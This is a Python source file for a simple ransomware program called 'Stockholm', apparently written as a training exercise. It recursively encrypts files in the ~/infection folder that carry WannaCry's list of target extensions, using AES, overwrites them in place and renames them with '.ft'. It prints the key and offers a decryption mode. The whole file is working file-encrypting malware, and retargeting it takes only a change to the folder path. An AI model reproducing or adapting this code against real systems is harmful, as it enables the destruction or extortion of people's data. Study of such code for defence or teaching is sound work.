#!/usr/bin/env python3
import argparse
import os
from Crypto.Cipher import AES

class Stockholm:
    def __init__(self):
        self.name = "Stockholm"
        self.inf_folder = os.path.join(os.path.expanduser("~"), "infection")
        self.key = os.urandom(32)
        self.flag = False
        self.issilent = False

        self.wannacry_ext = (
            ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", 
            ".sxw", ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", 
            ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", 
            ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3", 
            ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm", 
            ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c", 
            ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat", ".ps1", ".vbs", 
            ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", 
            ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", 
            ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", 
            ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", 
            ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", 
            ".bmp", ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", 
            ".gz", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", 
            ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", 
            ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", 
            ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst", 
            ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", 
            ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", 
            ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", 
            ".docx", ".doc"
        )

    def encryptFile(self, content, path):
        if not path.endswith(self.wannacry_ext):
            return None

        if not self.issilent:
            print(f"Encrypting file {path}...")

        cipher = AES.new(self.key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(content)

        os.rename(path, path + ".ft")
        self.flag = True

        return cipher.nonce + tag + ciphertext

    def decryptFile(self, content, path, revkey):
        if not path.endswith(".ft"):
            return None

        if not self.issilent:
            print(f"Decrypting file {path}...")

        nonce = content[:16]
        tag = content[16:32]
        ciphertext = content[32:]
        cipher = AES.new(revkey, AES.MODE_EAX, nonce)

        ret = cipher.decrypt_and_verify(ciphertext, tag)
        os.rename(path, path[:-3])
        return ret

    def recursivePathWalk(self, revkey):
        try:
            if not os.path.exists(self.inf_folder):
                return print(f"{self.inf_folder} does not exist")

            for root, dirs, files in os.walk(self.inf_folder):
                for file in files:
                    res = None
                    with open(os.path.join(root, file), "r+b") as f:
                        content = f.read()

                        if revkey:
                            res = self.decryptFile(content, os.path.join(root, file), revkey)
                        else:
                            res = self.encryptFile(content, os.path.join(root, file))

                        if res is None:
                            continue

                        f.truncate(0)
                        f.seek(0)
                        f.write(res)

        except Exception as e:
            print(f"Error: {e}")

    def run(self):
        argparser = argparse.ArgumentParser(description=self.name)
        argparser.add_argument('-v', '--version', action='version', version=f'{self.name} 1.0.0')
        argparser.add_argument('-r', '--reverse', type=str, help='Reverse the infection')
        argparser.add_argument('-s', '--silent', action='store_true', help='Silent mode')
        args = argparser.parse_args()

        revkey = None
        if args.reverse:
            try:
                revkey = bytes.fromhex(args.reverse)
            except Exception as e:
                return print(f"Error: {e}")
            
        if args.silent:
            self.issilent = True

        self.recursivePathWalk(revkey)

        if self.flag:
            print(f"Encryption key: {self.key.hex()}")

if __name__ == "__main__":
    stockholm = Stockholm()
    stockholm.run()
